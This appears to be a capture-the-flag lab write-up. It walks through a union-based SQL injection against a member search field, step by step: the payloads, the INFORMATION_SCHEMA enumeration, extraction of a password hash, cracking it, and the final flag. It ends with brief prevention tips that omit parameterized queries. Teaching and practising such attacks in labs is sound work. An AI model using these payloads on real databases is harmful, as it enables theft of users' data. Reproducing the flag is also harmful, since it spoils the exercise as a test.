# SQL Injection Vulnerability in Members Input Field

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

# How We find it ?

**Location:** `page=member`

**Step 0:**

write any string in the input field; this SQL error will be thrown.

```sql
Unknown column 'test' in 'where clause'

```

**Step 1:** try to write any basic SQL SELECT Statement in members input field as it is vulnerable to SQL injection

**Result:**

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'select \*' at line 1
```

**Step 2 :**
we write to the search field `74 or 1=1` or `74 or 1=1--` we can replace 74 by any other random id.
the input have a label:` SEARCH MEMBER BY ID` so the original query may be something similar to :

```sql
SELECT <column_name1>, <column_name2> FROM <table_name> WHERE ID = "id_number"

```

the injected query `74 or 1=1-- ` is typically combined with the original query by the application's backend code before being sent to the database for execution. so the resulted query is something like

```sql
 SELECT <column_name1>, <column_name2> FROM <table_name> WHERE ID = 74 or 1=1
```

In this case, the injected part '74 OR 1=1--' causes the query to return all rows from the users table because '1=1' is always true. If 'id=74' is not found, all the rows will be returned as 'OR 1=1' allows this to happen. The '--' at the end is used to comment out the rest of the original query to avoid syntax errors (it's not necessary to use the hyphens).
**Result:**

```sql
 result
 ID: 74 or 1=1
 First name: one
 Surname : me
```

> [!NOTE]
> the result show that the original select statement, query over two columns and this is a very important information to use in the sql query injection.

**Step 3 :**

In SQL injection attacks, knowing the number of columns in a SQL query can be important for constructing a SQL statement that doesn't break the syntax or structure of the original query. Additionally, if we want to use the UNION clause to combine other queries into the original, this condition should be fulfilled: Every SELECT statement within UNION must have the same number of columns.
We can use the `union-based` SQL injection technique to select more and more null values until the query is correct.
The UNION operator is used to combine the result sets of two or more SELECT statements.

```sql
SELECT _column_name(s)_ FROM _table1_ UNION SELECT _column_name(s)_ FROM _table2_;
```

Every SELECT statement within UNION must have the same number of columns.

Syntax example:

```sql

74 or 1=1 UNION SELECT null; -- The used SELECT statements have a different number of columns.
74 or 1=1 UNION SELECT null,null; -- This works.
74 or 1=1 UNION SELECT null,null,null; -- The used SELECT statements have a different number of columns.
```

**Step 3 :** use the information_schema database

`INFORMATION_SCHEMA` is a database within each MySQL instance, the place that stores information about all the other databases, contains several read-only tables, and not perform INSERT, UPDATE, or DELETE operations on them.
You can use queries against the information_schema database to retrieve information about the database server, such as:

- Listing databases and their properties (SCHEMATA table).
- Listing tables in a database (TABLES table).
- Listing columns in a table (COLUMNS table).
- Listing indexes in a table (STATISTICS table).
- Listing privileges that users have (SCHEMA_PRIVILEGES, TABLE_PRIVILEGES, COLUMN_PRIVILEGES tables).

```sql
74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables

```

```sql
ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: db_default
Surname : BASE TABLE

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: users
Surname : BASE TABLE

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: guestbook
Surname : BASE TABLE¦

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: list_images
Surname : BASE TABLE

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: vote_dbs
Surname : BASE TABLE

```

Here's a breakdown of what's happening:

- The original query appears to be something like SELECT \* FROM table WHERE ID = 74.
- The injection starts with 74 or 1=1 which is always true (1=1), effectively bypassing any ID-based filtering in the original query.
- Then, we perform a UNION with another SELECT statement that retrieves TABLE_NAME and TABLE_TYPE columns from the INFORMATION_SCHEMA.tables.
- The retrieved table names `db_default`, `users`,` guestbook`, `list_images`,` vote_dbs`
  the value BASE TABLE in the TABLE_TYPE column indicates that the table is a regular, user-created table, not a view or a system table

```sql
 74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
```

```sql
ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : user_id

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : first_name

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : last_name

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : town

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : country

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : planet

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : Commentaire

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
First name: users
Surname : countersign
....

```

we tried :

```sql
74 or 1=1 union select user_id, first_name  from users
74 or 1=1 union select last_name, town from users
74 or 1=1 union select country, planet from users
74 or 1=1 union select Commentaire, countersign from users

```

After testing these series of SQL injection attempts, we observed that the flag appeared in the final query. In the query

```sql
74 or 1=1 union select Commentaire, countersign from users
```

the result shows :

```sql
ID: 74 or 1=1 union select Commentaire, countersign from users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

```

The instruction indicates that to verify this password, one should decrypt it, convert all characters to lowercase, and then apply the SHA256 hashing algorithm.
the provided hash "5ff9d0165b4f92b14994e5c685cdce28" appears to be a 128-bit hexadecimal representation, which is often indicative of an MD5 hash.
using : https://www.dcode.fr/identification-chiffrement to execute the instructions

decrypt MD5(5ff9d0165b4f92b14994e5c685cdce28) : FortyTwo
lowercase the dycrepted value: fortytwo
sh256 of fortytwo value: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

the flag is : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## How to Prevent ?

To secure your application against SQL injection, implement the following measures:

1. **Validate and Sanitize Inputs:**

   - Restrict user input to expected formats using validation techniques.
   - Use input sanitization libraries or frameworks to clean data.

2. **Limit Database Permissions:**

   - Use the principle of least privilege by restricting the database user to only the necessary permissions.

3. **Monitor and Log Activities:**
   - Implement monitoring tools to detect unusual database queries.

**Resources:**

information_shema:

- https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.3/en/information-schema-introduction.html

MySQL Injection:

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
- https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection
- https://portswigger.net/web-security/sql-injection

dCode:

- https://www.dcode.fr/identification-chiffrement
